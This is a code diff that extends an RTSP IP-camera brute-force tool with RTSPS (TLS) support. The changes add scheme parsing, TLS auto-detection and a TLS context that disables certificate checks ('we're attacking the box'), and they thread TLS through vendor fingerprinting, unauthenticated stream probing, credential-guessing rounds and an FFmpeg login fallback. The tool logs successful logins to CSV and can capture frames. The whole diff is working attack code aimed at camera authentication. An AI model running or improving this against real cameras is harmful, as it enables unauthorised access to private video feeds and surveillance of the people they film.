@@ -54,6 +54,7 @@ os.environ.setdefault("OPENCV_FFMPEG_LOGLEVEL", "-8")
 os.environ.setdefault("OPENCV_LOG_LEVEL", "SILENT")
 
 import re
+import ssl
 import csv
 import socket
 import threading
@@ -373,12 +374,23 @@ def resolve_path(explicit, candidates):
 # Target parsing / reachability
 # --------------------------------------------------------------------------
 def parse_target(target):
-    """Split a target into ``(host, http_port, rtsp_port)``.
+    """Split a target into ``(host, http_port, rtsp_port, tls)``.
 
-    Accepts a bare IP/host, ``host:rtsp_port`` or ``[v6]:rtsp_port``. The HTTP
-    port is left at 80 (used only for fingerprinting)."""
+    Accepts a bare IP/host, ``host:rtsp_port`` or ``[v6]:rtsp_port``, optionally
+    with an ``rtsp://`` or ``rtsps://`` scheme (and an ignored trailing path).
+    ``tls`` is True for ``rtsps://``, False for an explicit ``rtsp://``, and None
+    for a bare target (meaning "decide later" — global flag or auto-detect).
+    ``rtsps://`` with no explicit port defaults to 322 (the IANA RTSPS port)
+    instead of 554. The HTTP port is left at 80 (fingerprinting only)."""
     target = target.strip()
-    host, http_port, rtsp_port = target, 80, 554
+    tls = None
+    lowered = target.lower()
+    if lowered.startswith("rtsps://"):
+        tls, target = True, target[len("rtsps://"):]
+    elif lowered.startswith("rtsp://"):
+        tls, target = False, target[len("rtsp://"):]
+    target = target.split("/", 1)[0]                 # drop any trailing path
+    host, http_port, rtsp_port = target, 80, (322 if tls else 554)
     if target.startswith('['):  # bracketed IPv6, optional :port
         end = target.find(']')
         if end != -1:
@@ -390,7 +402,7 @@ def parse_target(target):
         head, _, tail = target.rpartition(':')
         if tail.isdigit():
             host, rtsp_port = head, int(tail)
-    return host, http_port, rtsp_port
+    return host, http_port, rtsp_port, tls
 
 
 def tcp_reachable(host, ports, timeout):
@@ -448,17 +460,24 @@ def _http_fingerprint(host, port, timeout):
                             _header_value(raw, "WWW-Authenticate"), title)
 
 
-def _rtsp_fingerprint(host, port, timeout):
-    """Return a vendor guess from the RTSP OPTIONS `Server` header."""
+def _rtsp_fingerprint(host, port, timeout, tls=False):
+    """Return a vendor guess from the RTSP OPTIONS `Server` header (TLS-aware)."""
+    sock = _open(host, port, timeout, tls)
+    if sock is None:
+        return None
     try:
-        with socket.create_connection((host, port), timeout=timeout) as sock:
-            sock.settimeout(timeout)
-            request = (f"OPTIONS rtsp://{host}:{port} RTSP/1.0\r\n"
-                       f"CSeq: 1\r\nUser-Agent: RTSP-Brute-Force\r\n\r\n")
-            sock.sendall(request.encode())
-            raw = sock.recv(2048).decode("latin-1", "replace")
+        scheme = "rtsps" if tls else "rtsp"
+        request = (f"OPTIONS {scheme}://{host}:{port} RTSP/1.0\r\n"
+                   f"CSeq: 1\r\nUser-Agent: RTSP-Brute-Force\r\n\r\n")
+        sock.sendall(request.encode())
+        raw = sock.recv(2048).decode("latin-1", "replace")
     except OSError:
         return None
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
     return _match_signature(_header_value(raw, "Server"))
 
 
@@ -556,18 +575,19 @@ def onvif_stream_routes(host, http_port, rtsp_port, creds, timeout):
     return [], None
 
 
-def fingerprint(host, http_port, rtsp_port, username, password, timeout):
+def fingerprint(host, http_port, rtsp_port, username, password, timeout, tls=False):
     """Identify a camera's ``(vendor, model)`` best-signal-first.
 
     ONVIF (vendor + model) -> HTTP headers (vendor) -> RTSP OPTIONS (vendor).
     Model is only recoverable via ONVIF; without it the vendor-wide RTSP routes
-    still give broad coverage.
+    still give broad coverage. The RTSP OPTIONS probe follows the target's TLS
+    setting; ONVIF/HTTP fingerprinting stays on the plain HTTP port.
     """
     vendor, model = _onvif_fingerprint(host, http_port, username, password, timeout)
     if vendor is None:
         vendor = _http_fingerprint(host, http_port, timeout)
     if vendor is None:
-        vendor = _rtsp_fingerprint(host, rtsp_port, timeout)
+        vendor = _rtsp_fingerprint(host, rtsp_port, timeout, tls)
     return vendor, model
 
 
@@ -614,14 +634,55 @@ def _auth_header(www, user, password, method, uri):
     return ""
 
 
-def _open(host, port, timeout):
-    """Open one RTSP TCP connection, or return None on failure."""
+# Reused TLS context for RTSPS: cameras almost always present self-signed certs,
+# so verification is disabled (we're attacking the box, not trusting it).
+_TLS_CTX = ssl.create_default_context()
+_TLS_CTX.check_hostname = False
+_TLS_CTX.verify_mode = ssl.CERT_NONE
+
+
+def _open(host, port, timeout, tls=False):
+    """Open one RTSP connection, or return None on failure. When ``tls`` is set,
+    the socket is wrapped in TLS for RTSPS (``rtsps://``)."""
     try:
         sock = socket.create_connection((host, port), timeout=timeout)
         sock.settimeout(timeout)
+        if tls:
+            sock = _TLS_CTX.wrap_socket(sock, server_hostname=host)
         return sock
-    except OSError:
+    except Exception:
         return None
+
+
+def detect_tls(host, port, timeout):
+    """Decide whether ``port`` speaks plaintext RTSP or RTSPS. Returns True for
+    TLS, False for plaintext / unknown.
+
+    Plaintext-first for speed: a real RTSP server answers a plaintext ``OPTIONS``
+    with ``RTSP/...`` immediately, so plaintext cameras are settled in one round
+    trip (a TLS handshake against them would instead hang until timeout). Only
+    when the plaintext probe yields no RTSP reply do we attempt a TLS handshake."""
+    try:
+        raw = socket.create_connection((host, port), timeout=timeout)
+        raw.settimeout(timeout)
+        raw.sendall(f"OPTIONS rtsp://{host}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
+        data = raw.recv(256)
+        raw.close()
+        if data[:5] == b"RTSP/":
+            return False
+    except OSError:
+        pass
+    try:
+        raw = socket.create_connection((host, port), timeout=timeout)
+        raw.settimeout(timeout)
+        _TLS_CTX.wrap_socket(raw, server_hostname=host).close()
+        return True
+    except Exception:
+        try:
+            raw.close()
+        except Exception:
+            pass
+        return False
 
 
 def _send_describe(sock, uri, cseq, auth=None):
@@ -661,9 +722,9 @@ def _send_describe(sock, uri, cseq, auth=None):
     return code, headers
 
 
-def _describe_unauth(host, port, uri, timeout):
+def _describe_unauth(host, port, uri, timeout, tls=False):
     """One unauthenticated DESCRIBE on its own connection. Returns ``(code, www)``."""
-    sock = _open(host, port, timeout)
+    sock = _open(host, port, timeout, tls)
     if sock is None:
         return None, ""
     try:
@@ -676,7 +737,7 @@ def _describe_unauth(host, port, uri, timeout):
             pass
 
 
-def _describe_auth(host, port, uri, user, password, timeout):
+def _describe_auth(host, port, uri, user, password, timeout, tls=False):
     """Full authenticated DESCRIBE over ONE connection: fetch the challenge and
     send the credentialed reply on the same socket. Returns the final status
     code (None on a socket error).
@@ -685,7 +746,7 @@ def _describe_auth(host, port, uri, user, password, timeout):
     connection-bound Digest nonce/realm on every TCP connection, so a challenge
     fetched on one socket can never be answered on another.
     """
-    sock = _open(host, port, timeout)
+    sock = _open(host, port, timeout, tls)
     if sock is None:
         return None
     try:
@@ -710,26 +771,26 @@ def _describe_auth(host, port, uri, user, password, timeout):
             pass
 
 
-def _route_uri(host, port, raw_path, user, password):
+def _route_uri(host, port, raw_path, user, password, tls=False):
     path = substitute(raw_path, user or "", password or "")
     if not path.startswith("/"):
         path = "/" + path
-    return f"rtsp://{host}:{port}{path}"
+    return f"{'rtsps' if tls else 'rtsp'}://{host}:{port}{path}"
 
 
-def probe_open_access(host, routes, timeout, limit=3):
+def probe_open_access(host, routes, timeout, tls=False, limit=3):
     """One unauthenticated DESCRIBE on each of the first ``limit`` routes. Returns
     an open-access result dict if any streams without auth (200), else None. Kept
     to a few routes so this stays a light touch on the camera."""
     for raw_path, port in routes[:limit]:
-        uri = _route_uri(host, port, raw_path, "", "")
-        code, _ = _describe_unauth(host, port, uri, timeout)
+        uri = _route_uri(host, port, raw_path, "", "", tls)
+        code, _ = _describe_unauth(host, port, uri, timeout, tls)
         if code == 200:
             return {"user": "", "password": "", "url": uri, "unauthenticated": True}
     return None
 
 
-def native_attempt(host, routes, cred, timeout):
+def native_attempt(host, routes, cred, timeout, tls=False):
     """Try ONE credential against a host's routes with the native RTSP engine.
     Returns a result dict on success, else None.
 
@@ -747,32 +808,32 @@ def native_attempt(host, routes, cred, timeout):
         return None
     user, password = cred
     primary_path, primary_port = routes[0]
-    uri = _route_uri(host, primary_port, primary_path, user, password)
-    code = _describe_auth(host, primary_port, uri, user, password, timeout)
+    uri = _route_uri(host, primary_port, primary_path, user, password, tls)
+    code = _describe_auth(host, primary_port, uri, user, password, timeout, tls)
     if code == 200:
         return {"user": user, "password": password, "url": uri}
     if code == 404:  # credential valid, wrong path -> sweep the other routes
         for raw_path, port in routes:
-            sweep_uri = _route_uri(host, port, raw_path, user, password)
-            if _describe_auth(host, port, sweep_uri, user, password, timeout) == 200:
+            sweep_uri = _route_uri(host, port, raw_path, user, password, tls)
+            if _describe_auth(host, port, sweep_uri, user, password, timeout, tls) == 200:
                 return {"user": user, "password": password, "url": sweep_uri}
         # Authenticated, but none of our known routes streamed.
         return {"user": user, "password": password, "url": uri, "no_route": True}
     return None
 
 
-def ffmpeg_attempt(host, port, cred):
+def ffmpeg_attempt(host, port, cred, tls=False):
     """Try ONE credential via the FFmpeg route-removed open (the original tool's
     method). Returns a result dict on success, else None. OpenCV-only."""
     if not _HAS_CV2:
         return None
-    url = _ffmpeg_login(host, port, cred[0], cred[1])
+    url = _ffmpeg_login(host, port, cred[0], cred[1], tls)
     if url:
         return {"user": cred[0], "password": cred[1], "url": url, "ffmpeg": True}
     return None
 
 
-def _root_uri(host, port, user, password):
+def _root_uri(host, port, user, password, tls=False):
     """Route-removed RTSP URL with credentials in the authority component, e.g.
     ``rtsp://user:pass@host:port`` (anonymous when no creds). This is the form
     the original tool used — no explicit stream path."""
@@ -781,10 +842,10 @@ def _root_uri(host, port, user, password):
         cred = f"{quote(user or '', safe='')}:{quote(password or '', safe='')}@"
     else:
         cred = ""
-    return f"rtsp://{cred}{host}:{port}"
+    return f"{'rtsps' if tls else 'rtsp'}://{cred}{host}:{port}"
 
 
-def _ffmpeg_login(host, port, user, password):
+def _ffmpeg_login(host, port, user, password, tls=False):
     """Last-resort login check via a full FFmpeg negotiation on the route-removed
     URL, mirroring the original tool. Returns the working URL if the stream
     opens, else None.
@@ -793,10 +854,11 @@ def _ffmpeg_login(host, port, user, password):
     can confirm a credential on cameras whose bare DESCRIBE answers an
     indistinguishable 401 for both a wrong credential AND a valid credential on a
     wrong path. Needs OpenCV; a silent no-op without it. The connect/read time is
-    bounded by OPENCV_FFMPEG_CAPTURE_OPTIONS (set at import time)."""
+    bounded by OPENCV_FFMPEG_CAPTURE_OPTIONS (set at import time). For RTSPS
+    (``rtsps://``) FFmpeg negotiates TLS itself."""
     if not _HAS_CV2:
         return None
-    url = _root_uri(host, port, user, password)
+    url = _root_uri(host, port, user, password, tls)
     try:
         video_capture = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
         try:
@@ -861,7 +923,9 @@ def prepare_host(target, base_combos, db, options):
     round driver consumes. Doing the fingerprint/route work once here — and no
     25-route discovery burst — keeps per-camera connection volume low so the
     device doesn't rate-limit before the credential rounds even start."""
-    host, http_port, rtsp_port = parse_target(target)
+    host, http_port, rtsp_port, tls = parse_target(target)
+    if tls is None:                            # not fixed by rtsp(s):// scheme
+        tls = options.get("tls")               # ...then the global -T flag
     if options.get("http_port"):        # -H overrides the HTTP/ONVIF port
         http_port = options["http_port"]
 
@@ -872,11 +936,17 @@ def prepare_host(target, base_combos, db, options):
                 display('-', f"{target} => Unreachable (skipped)")
         return {"target": target, "status": "UNREACHABLE", "vendor": "", "model": ""}
 
+    if tls is None:                            # still unspecified -> auto-detect
+        tls = detect_tls(host, rtsp_port, min(options["reach_timeout"] or 3, 4))
+        if tls and options["verbose"]:
+            with lock:
+                display('*', f"{target} => RTSPS (TLS) detected")
+
     vendor, model = (None, None)
     if options["fingerprint"]:
         vendor, model = fingerprint(host, http_port, rtsp_port,
                                     options["fp_user"], options["fp_pass"],
-                                    options["reach_timeout"] or 3.0)
+                                    options["reach_timeout"] or 3.0, tls)
         if options["verbose"] and (vendor or model):
             with lock:
                 display('*', f"{target} => Vendor={vendor or '?'} Model={model or '?'}")
@@ -903,7 +973,8 @@ def prepare_host(target, base_combos, db, options):
             creds = [onvif_cred] + [c for c in creds if c != onvif_cred]
 
     return {"target": target, "status": "READY", "host": host, "rtsp_port": rtsp_port,
-            "routes": routes, "creds": creds, "vendor": vendor or "", "model": model or ""}
+            "tls": tls, "routes": routes, "creds": creds,
+            "vendor": vendor or "", "model": model or ""}
 
 
 # --------------------------------------------------------------------------
@@ -942,6 +1013,7 @@ if __name__ == "__main__":
                               ('-r', "--reach-timeout", "reach_timeout", "TCP reachability pre-check timeout in seconds; 0 disables it (Default=2.0)"),
                               ('-R', "--rtsp-timeout", "rtsp_timeout", "Per-request RTSP DESCRIBE timeout in seconds (Default=6.0)"),
                               ('-H', "--http-port", "http_port", "HTTP/ONVIF port for fingerprinting on cameras whose web interface isn't on 80 (Default=80). Tried first, ahead of the standard ONVIF ports. The RTSP port is set per target with host:port."),
+                              ('-T', "--tls", "tls", "Force RTSP-over-TLS / RTSPS on or off for every target: True (force TLS), False (force plaintext). Default (unset) = auto-detect per host. Per-target TLS can also be set with an rtsps:// (or rtsp://) prefix, e.g. rtsps://host:9000."),
                               ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
                               ('-c', "--capture", "capture", f"Capture Frame if Successful Login (True/False, Default={capture_frame})"),
                               ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
@@ -1100,6 +1172,9 @@ if __name__ == "__main__":
         reach_timeout = float(arguments.reach_timeout) if arguments.reach_timeout is not None else 2.0
         rtsp_timeout = float(arguments.rtsp_timeout) if arguments.rtsp_timeout is not None else 6.0
         max_routes = int(arguments.max_routes) if arguments.max_routes is not None else 25
+        # Tri-state: True (force TLS), False (force plaintext), None (auto-detect).
+        tls_option = True if arguments.tls == "True" else (
+            False if arguments.tls == "False" else None)
         http_port_override = int(arguments.http_port) if arguments.http_port else None
         if arguments.capture == "True":
             frames_folder = Path.cwd() / "frames"
@@ -1137,6 +1212,7 @@ if __name__ == "__main__":
             "rtsp_timeout": rtsp_timeout,
             "max_routes": max_routes,
             "http_port": http_port_override,
+            "tls": tls_option,
             "fp_user": arguments.user[0] if arguments.user else "",
             "fp_pass": arguments.password[0] if arguments.password else "",
         }
@@ -1225,7 +1301,8 @@ if __name__ == "__main__":
 
         # Round 0 — cheap open-access (unauthenticated) check on each host.
         for state, result in run_batch(
-                ready, lambda st: probe_open_access(st["host"], st["routes"], options["rtsp_timeout"]),
+                ready, lambda st: probe_open_access(st["host"], st["routes"],
+                                                    options["rtsp_timeout"], st["tls"]),
                 "Open-access"):
             if result:
                 register(state, result)
@@ -1233,7 +1310,8 @@ if __name__ == "__main__":
         # Phase 2 — native credential-outer rounds.
         credential_rounds(
             ready,
-            lambda st, cred: native_attempt(st["host"], st["routes"], cred, options["rtsp_timeout"]),
+            lambda st, cred: native_attempt(st["host"], st["routes"], cred,
+                                            options["rtsp_timeout"], st["tls"]),
             "Brute")
 
         # Phase 3 — FFmpeg route-removed fallback (original tool's method), also
@@ -1241,7 +1319,7 @@ if __name__ == "__main__":
         if _HAS_CV2:
             credential_rounds(
                 ready,
-                lambda st, cred: ffmpeg_attempt(st["host"], st["rtsp_port"], cred),
+                lambda st, cred: ffmpeg_attempt(st["host"], st["rtsp_port"], cred, st["tls"]),
                 "FFmpeg")
         t2 = time()
 
